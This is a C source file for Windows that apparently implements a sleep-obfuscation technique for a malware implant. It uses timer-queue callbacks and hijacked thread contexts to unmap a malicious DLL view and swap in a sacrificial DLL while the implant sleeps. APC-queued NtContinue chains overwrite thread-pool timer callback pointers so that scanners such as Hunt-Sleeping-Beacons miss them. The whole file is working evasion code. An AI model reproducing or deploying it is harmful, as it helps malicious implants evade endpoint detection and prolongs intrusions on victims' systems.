#pragma once

#include <Windows.h>
#include "headers.h"




/*------------------------------------------------------------*/


int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE EvntFix, PHANDLE apcThreads, PCONTEXT Ctx, PCONTEXT CtxInit, PCONTEXT CtxFix, PCONTEXT CtxInitFix, PDWORD64 ResumeThreadValue) {
    //variables and logic for SLEAPING APC callback hiding
    
    //APC threads
    HANDLE   Thread = { 0 };
    HANDLE   ThreadFix = { 0 };

    //function pointers 
    PVOID NtTestAlertAddress = NULL;
    PVOID NtWaitForSingleObjectAddress = NULL;
    PVOID NtContinueAddress = NULL;
    PVOID MessageBoxAddress = NULL;
    //safecallback
    PDWORD64 SafeCallback = (PDWORD64)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	//handle to ntdll and user32
    HMODULE hNtdll = { 0 };
    HMODULE hUser32 = { 0 };

    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        return -1;
    }
    if (!(hUser32 = GetModuleHandleA("user32.dll"))) {
        return -1;
    }
	//function pointers for thread contexts
    NtTestAlertAddress = GetProcAddress(hNtdll, "NtTestAlert");
    NtWaitForSingleObjectAddress = GetProcAddress(hNtdll, "NtWaitForSingleObject");
    NtContinueAddress = GetProcAddress(hNtdll, "NtContinue");
    MessageBoxAddress = GetProcAddress(hUser32, "MessageBoxA");
    *SafeCallback = (DWORD64)MessageBoxAddress;

	
    if (NtTestAlertAddress == NULL || NtWaitForSingleObjectAddress == NULL || NtContinueAddress == NULL || MessageBoxAddress == NULL) {
        return -1;
    }
    
    
	//NT functions
    NtCreateThreadExFunc NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hNtdll, "NtCreateThreadEx");
    NtGetContextThreadFunc NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hNtdll, "NtGetContextThread");
    NtWaitForSingleObjectFunc NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    NtQueueApcThreadFunc NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hNtdll, "NtQueueApcThread");
    NtAlertResumeThreadFunc NtAlertResumeThread = (NtAlertResumeThreadFunc)GetProcAddress(hNtdll, "NtAlertResumeThread");


    if (NtCreateThreadEx == NULL || NtGetContextThread == NULL || NtWaitForSingleObject == NULL || NtQueueApcThread == NULL || NtAlertResumeThread == NULL) {
        return -1;
    }

    /*-----------HIDING-------------*/


    //i create a thread and i think that with this API and a NULL function address it gets created in suspended state (it does, still not alertable though)
    if (!NT_SUCCESS(NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
        return -1;
    }

    //i copy the context of the thread created 
    (*CtxInit).ContextFlags = CONTEXT_FULL;
    if (!NT_SUCCESS(NtGetContextThread(Thread, CtxInit))) {
        return -1;
    }

    /* prepare ROP initializing all the context as the same thread that will be picked by the APC queue*/
    for (int i = 0; i < 8; i++) {
        custom_memcpy_classic(&Ctx[i], CtxInit, sizeof(CONTEXT));
    }

    
    /*-------------FIXING--------------*/


    //i create a thread and i think that with this API and a NULL function address it gets created in suspended state (it does, still not alertable though)
    if (!NT_SUCCESS(NtCreateThreadEx(&ThreadFix, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
        return -1;
    }

    //i copy the context of the thread created 
    (*CtxInitFix).ContextFlags = CONTEXT_FULL;
    if (!NT_SUCCESS(NtGetContextThread(ThreadFix, CtxInitFix))) {
        return -1;
    }

    /* prepare ROP initializing all the context as the same thread that will be picked by the APC queue*/
    for (int i = 0; i < 8; i++) {
        custom_memcpy_classic(&CtxFix[i], CtxInitFix, sizeof(CONTEXT));
    }


	
    /*-----------HIDING THREADS-------------*/
   
    //first thread just waiting for the event to be set
    *(ULONG_PTR*)((Ctx[0]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[0].Rip = (DWORD64)NtWaitForSingleObjectAddress;
    Ctx[0].Rcx = (DWORD64)(*EvntHide);
    Ctx[0].Rdx = FALSE;
    Ctx[0].R8 = NULL;

    *(ULONG_PTR*)((Ctx[1]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[1].Rip = (DWORD64)WriteProcessMemory;
    Ctx[1].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[1].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
    Ctx[1].R8 = (DWORD64)SafeCallback;
    Ctx[1].R9 = (DWORD64)sizeof(PVOID);

    
    *(ULONG_PTR*)((Ctx[2]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[2].Rip = (DWORD64)WriteProcessMemory;
    Ctx[2].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[2].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
    Ctx[2].R8 = (DWORD64)SafeCallback;
    Ctx[2].R9 = (DWORD64)sizeof(PVOID);

    
    *(ULONG_PTR*)((Ctx[3]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[3].Rip = (DWORD64)WriteProcessMemory;
    Ctx[3].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[3].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
    Ctx[3].R8 = (DWORD64)SafeCallback;
    Ctx[3].R9 = (DWORD64)sizeof(PVOID);

    
    *(ULONG_PTR*)((Ctx[4]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[4].Rip = (DWORD64)WriteProcessMemory;
    Ctx[4].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[4].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
    Ctx[4].R8 = (DWORD64)SafeCallback;
    Ctx[4].R9 = (DWORD64)sizeof(PVOID);

    
    *(ULONG_PTR*)((Ctx[5]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[5].Rip = (DWORD64)WriteProcessMemory;
    Ctx[5].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[5].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
    Ctx[5].R8 = (DWORD64)SafeCallback;
    Ctx[5].R9 = (DWORD64)sizeof(PVOID);

	//set the event that would trigger the fixing callback thread
    *(ULONG_PTR*)((Ctx[6]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[6].Rip = (DWORD64)(SetEvent);
    Ctx[6].Rcx = (DWORD64)(*EvntFix);

    Ctx[7].Rip = (DWORD64)(ExitThread);
    Ctx[7].Rcx = (DWORD64)0x00;

    //always the same thread is queued but with a different context
    //any thread has its own APC queue. After processing that APC, the thread will return to its previous state, typically exiting the alertable state unless it's put back into an alertable state explicitly
    for (int i = 0; i < 8; i++) {
        if (!NT_SUCCESS(NtQueueApcThread(Thread, (PPS_APC_ROUTINE)NtContinueAddress, &Ctx[i], FALSE, NULL))) {
            return -1;
        }
    }


    // this is to put the thread in alertable state in fact starting to pick up tasks
    if (!NT_SUCCESS(NtAlertResumeThread(Thread, NULL))) {
        return -1;
    }

    /*-----------FIXING THREADS-------------*/

    //first thread just waiting for the event to be set
    //this event will be set by the first APC threads
    *(ULONG_PTR*)((CtxFix[0]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[0].Rip = (DWORD64)NtWaitForSingleObjectAddress;
    CtxFix[0].Rcx = (DWORD64)(*EvntFix);
    CtxFix[0].Rdx = FALSE;
    CtxFix[0].R8 = NULL;

    *(ULONG_PTR*)((CtxFix[1]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[1].Rip = (DWORD64)(Sleep);
    CtxFix[1].Rcx = (DWORD64)17000;

    *(ULONG_PTR*)((CtxFix[2]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[2].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[2].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[2].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
    CtxFix[2].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[2].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[3]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[3].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[3].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[3].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
    CtxFix[3].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[3].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[4]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[4].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[4].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[4].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
    CtxFix[4].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[4].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[5]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[5].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[5].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[5].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
    CtxFix[5].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[5].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[6]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[6].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[6].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[6].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
    CtxFix[6].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[6].R9 = (DWORD64)sizeof(PVOID);

    CtxFix[7].Rip = (DWORD64)(ExitThread);
    CtxFix[7].Rcx = (DWORD64)0x00;

    for (int i = 0; i < 8; i++) {
        if (!NT_SUCCESS(NtQueueApcThread(ThreadFix, (PPS_APC_ROUTINE)NtContinueAddress, &CtxFix[i], FALSE, NULL))) {
            return -1;
        }
    }

    if (!NT_SUCCESS(NtAlertResumeThread(ThreadFix, NULL))) {
        return -1;
    }

    /*-----------------------------------------*/

    apcThreads[0] = Thread;
    apcThreads[1] = ThreadFix;
 
    return 0;
}


//original unmodified version can be found here
//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, int* arraySize, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {

    //objects for the worker factory
    WORKER_FACTORY_BASIC_INFORMATION wfbi = { 0 };
    FULL_TP_POOL full_tp_pool = { 0 };
    PFULL_TP_TIMER p_tp_timer = NULL, p_head = NULL;
    FULL_TP_TIMER tp_timer = { 0 };
    SIZE_T len = 0;
    TPP_CLEANUP_GROUP_MEMBER ctx = { 0 };
    HMODULE hNtdll = { 0 };


    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        return -1;
    }
	//retrieve NT functions
    NtQueryInformationWorkerFactoryFunc NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
    if (NtQueryInformationWorkerFactory == NULL) {
        return -1;
    }

    if (NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &wfbi, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL) == STATUS_SUCCESS) {

		if (ReadProcessMemory(GetCurrentProcess(), wfbi.StartParameter, &full_tp_pool, sizeof(FULL_TP_POOL), &len) == FALSE) {
            return -1;
		}
        
        if (full_tp_pool.TimerQueue.RelativeQueue.WindowStart.Root)
            p_tp_timer = CONTAINING_RECORD(full_tp_pool.TimerQueue.RelativeQueue.WindowStart.Root, FULL_TP_TIMER, WindowStartLinks);
        else if (full_tp_pool.TimerQueue.AbsoluteQueue.WindowStart.Root)
            p_tp_timer = CONTAINING_RECORD(full_tp_pool.TimerQueue.AbsoluteQueue.WindowStart.Root, FULL_TP_TIMER, WindowStartLinks);
        else {
            return -1;
        }

		if (ReadProcessMemory(GetCurrentProcess(), p_tp_timer, &tp_timer, sizeof(FULL_TP_TIMER), &len) == FALSE) {
			return -1;
		}
        
        PLIST_ENTRY pHead = tp_timer.WindowStartLinks.Children.Flink;
        PLIST_ENTRY pFwd = tp_timer.WindowStartLinks.Children.Flink;
        LIST_ENTRY entry = { 0 };
        
        do {
           
			if (ReadProcessMemory(GetCurrentProcess(), tp_timer.Work.CleanupGroupMember.Context, &ctx, sizeof(TPP_CLEANUP_GROUP_MEMBER), &len) == FALSE) {
                break;
			}
            
            if ((ctx).FinalizationCallback == ResumeThreadAddress) {
            
                callbackArray[*arraySize] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object

                (*arraySize)++;

            }


            p_tp_timer = CONTAINING_RECORD(pFwd, FULL_TP_TIMER, WindowStartLinks);
			if (ReadProcessMemory(GetCurrentProcess(), p_tp_timer, &tp_timer, sizeof(FULL_TP_TIMER), &len) == FALSE) {
                break;
			}
            
            ReadProcessMemory(GetCurrentProcess(), pFwd, &entry, sizeof(LIST_ENTRY), &len);
            pFwd = entry.Flink;

        } while (pHead != pFwd);

    }
    
    return 0;


}

//original unmodified version can be found here
//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {


    HMODULE hNtdll = { 0 };
    int arraySize = 0;


    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        return -1;
    }

    //retrieve syscalls address 
    NtQuerySystemInformationFunc NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {

        return -1;
    }
    NtQueryObjectFunc NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hNtdll, "NtQueryObject");
    if (NtQuerySystemInformation == NULL) {
        return -1;
    }

    // Call NtQuerySystemInformation to get the handles information
    ULONG bufferSize = 0x1000; 
    PVOID buffer = NULL;
    NTSTATUS status;
    buffer = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        return -1;
    }

    while ((status = NtQuerySystemInformation(
        SystemHandleInformation,
        buffer,
        bufferSize,
        NULL
    )) == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        buffer = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(NULL, bufferSize *= 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    // NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
    if (!NT_SUCCESS(status)) {
        return -1;
    }


    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
    POBJECT_TYPE_INFORMATION objectTypeInfo;
    //to free still
    objectTypeInfo = (POBJECT_TYPE_INFORMATION)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    for (ULONG_PTR i = 0; i < handleInfo->HandleCount; i++) {

        SYSTEM_HANDLE handle = handleInfo->Handles[i];

        //for each handle i check whether it belongs to my process
        if (handle.ProcessId == GetProcessId(GetCurrentProcess())) {


            if (NtQueryObject((void*)handle.Handle, ObjectTypeInformation, objectTypeInfo, sizeof(OBJECT_TYPE_INFORMATION) * 2, NULL) < 0) {

                continue;
            }
            //if it's a TpWorkerFactory object I enumerate further
            if (!lstrcmpW(objectTypeInfo->Name.Buffer, L"TpWorkerFactory")) {

				
                if (GetInfoFromWorkerFactory((HANDLE)handle.Handle, ResumeThreadAddress, &arraySize, callbackArray) == -1) {
                
					arraySize = 0;
					continue;
                }
				//Found the right TpWorkerFactory, because i know there are 5 callbacks for the ResumeThread function
                if (arraySize == 5) {

                    if (objectTypeInfo) VirtualFree(objectTypeInfo, 0, MEM_RELEASE);
                    if (buffer) VirtualFree(buffer, 0, MEM_RELEASE);
                    return 0;

                }
                arraySize = 0;
            }

        }

    }
    
	if (objectTypeInfo) VirtualFree(objectTypeInfo, 0, MEM_RELEASE);
    if (buffer) VirtualFree(buffer, 0, MEM_RELEASE);
    return -1;

}

/*-----------------------------------------------------------*/

int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {

    //APC Threads
    PHANDLE ApcThreads = (PHANDLE)(VirtualAlloc(NULL, 2 * sizeof(HANDLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    //Context APC threads
    CONTEXT* Ctx = (CONTEXT*)(VirtualAlloc(NULL, 8 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* CtxInit = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));


    //context APC threads fix callback
    CONTEXT* CtxFix = (CONTEXT*)(VirtualAlloc(NULL, 8 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* CtxInitFix = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    //events for APC threads
    HANDLE   EvntHide = { 0 };
    HANDLE   EvntFix = { 0 };

    //support NT functions 
    NTSTATUS Status = { 0 };
    HMODULE hNtdll = { 0 };

    //callbackArray for APC to spoof
    PTPP_CLEANUP_GROUP_MEMBER* callbackArray = (PTPP_CLEANUP_GROUP_MEMBER*)VirtualAlloc(NULL, 5 * sizeof(PTPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PDWORD64 ResumeThreadValue = (PDWORD64)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//sleaping threads = 5 + 2 APC threads
    HANDLE ThreadArray[7] = { NULL };

    //timers variables
    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;
    PVOID ResumeThreadAddress = NULL;

    //initializing callback array structs
    for (int i = 0; i < 5; i++) {
        callbackArray[i] = (PTPP_CLEANUP_GROUP_MEMBER)VirtualAlloc(NULL, sizeof(TPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        return -1;
    }
    NtCreateEventFunc NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hNtdll, "NtCreateEvent");

	if (NtCreateEvent == NULL) {
		return -1;
	}   

    //i create the sync event that would trigger the first thread (triggered via timers that invoke SetEvent in 
    //order to trigger eventually Event Fix
    if (!NT_SUCCESS(Status = NtCreateEvent(&EvntHide, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
        return -1;
    }
    if (!NT_SUCCESS(Status = NtCreateEvent(&EvntFix, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
        return -1;
    }

    //variables and logic for SLEAPING timers
    CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextC = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextD = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextE = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));


    if (context == NULL || contextB == NULL || contextC == NULL || contextD == NULL || contextE == NULL) {
        return -1;
    }

    context->ContextFlags = CONTEXT_ALL;
    contextB->ContextFlags = CONTEXT_ALL;
    contextC->ContextFlags = CONTEXT_ALL;
    contextD->ContextFlags = CONTEXT_ALL;
    contextE->ContextFlags = CONTEXT_ALL;

    // Create a thread to control
    ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[0] == NULL) {

        return -1;
    }
    ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[1] == NULL) {

        return -1;
    }
    ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[2] == NULL) {

        return -1;
    }
    ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[3] == NULL) {

        return -1;
    }
    ThreadArray[4] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SetEvent, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[4] == NULL) {

        return -1;
    }


    GetThreadContext(ThreadArray[0], context);//unmap
    GetThreadContext(ThreadArray[1], contextB);//mapex
    GetThreadContext(ThreadArray[2], contextC);//unmap
    GetThreadContext(ThreadArray[3], contextD);//mapex
    GetThreadContext(ThreadArray[4], contextE);//mapex


    *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
    (*context).Rip = (DWORD64)UnmapViewOfFile;
    (*context).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
    (*contextB).Rip = (DWORD64)MapViewOfFileEx;
    (*contextB).Rcx = (DWORD64)sacDllHandle;
    (*contextB).Rdx = FILE_MAP_ALL_ACCESS;
    (*contextB).R8 = (DWORD64)0x00;
    (*contextB).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextB).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextB).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    *(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)ExitThread;
    (*contextC).Rip = (DWORD64)UnmapViewOfFile;
    (*contextC).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
    (*contextD).Rip = (DWORD64)MapViewOfFileEx;
    (*contextD).Rcx = (DWORD64)malDllHandle;
    (*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*contextD).R8 = (DWORD64)0x00;
    (*contextD).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

	//one more thread to trigger the APC threads for the callbacks spoofing
    *(ULONG_PTR*)((*contextE).Rsp) = (DWORD64)ExitThread;
    (*contextE).Rip = (DWORD64)SetEvent;
    (*contextE).Rcx = (DWORD64)(EvntHide);

    SetThreadContext(ThreadArray[0], context);//unmap
    SetThreadContext(ThreadArray[1], contextB);//map
    SetThreadContext(ThreadArray[2], contextC);//unmap 
    SetThreadContext(ThreadArray[3], contextD);//mapmal
    SetThreadContext(ThreadArray[4], contextE);//setevent   

    hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        return -1;
    }
    
    ResumeThreadAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");
    *ResumeThreadValue = (DWORD64)ResumeThreadAddress;
    if (ResumeThreadAddress != NULL) {

        //these two need to be bit longer in order for the spoofing to work properly, needs more testing for a more precise waiting
		//i need to wait to enumerate all the callbacks before unmapping the view
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 1000, 0, WT_EXECUTEINTIMERTHREAD);//unamp
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 1100, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[4], 2000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 20000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 20100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
        
        //TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix
        if (EnumResumeThreadCallbacks(ResumeThreadAddress, callbackArray) == 0) {
            //i should run SleapingAPC here so that all those contexts are available
            if (SleapingAPC(callbackArray, &EvntHide, &EvntFix, ApcThreads, Ctx, CtxInit, CtxFix, CtxInitFix, ResumeThreadValue) == 0) {
                
                int counter = 5;
                for (int i = 0; i < 2; i++) {

                    //adding the newly created APC threads to the thread array to be waiting for
                    ThreadArray[counter] = ApcThreads[i];//5
                    counter++;

                }
            }
            else {
                return -1;
            }
		}
		else {
			return -1;
		}

        
        if (WaitForMultipleObjects(7, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
            return -1;
        }
    }
    //good morning
    if (DeleteTimerQueue(hTimerQueue) == 0) {

        return -1;
    }
    //clean up totale
    if (context) VirtualFree(context, 0, MEM_RELEASE);
    if (contextB) VirtualFree(contextB, 0, MEM_RELEASE);
    if (contextC) VirtualFree(contextC, 0, MEM_RELEASE);
    if (contextD) VirtualFree(contextD, 0, MEM_RELEASE);
    if (contextE) VirtualFree(contextE, 0, MEM_RELEASE);
    if (callbackArray) VirtualFree(callbackArray, 0, MEM_RELEASE);
    if (ApcThreads) VirtualFree(ApcThreads, 0, MEM_RELEASE);
	if (Ctx) VirtualFree(Ctx, 0, MEM_RELEASE);
	if (CtxInit) VirtualFree(CtxInit, 0, MEM_RELEASE);
	if (CtxFix) VirtualFree(CtxFix, 0, MEM_RELEASE);
	if (CtxInitFix) VirtualFree(CtxInitFix, 0, MEM_RELEASE);

    return 0;

}